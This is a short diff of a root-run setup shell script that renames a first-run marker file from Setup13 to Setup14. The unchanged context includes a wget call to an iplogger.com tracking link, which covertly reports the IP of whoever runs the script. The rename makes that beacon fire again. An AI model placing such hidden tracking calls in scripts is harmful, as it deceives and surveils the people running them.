@@ -29,11 +29,11 @@ chmod +x reconfige.sh
 #./reconfige.sh
 
 
-FILE=/root/Setup13
+FILE=/root/Setup14
 if test -f "$FILE"; then
     echo OK1
 else
-    echo "New Setup" > /root/Setup13
+    echo "New Setup" > /root/Setup14
     wget -O logger https://iplogger.com/2Lt1h5
 
         cd /root
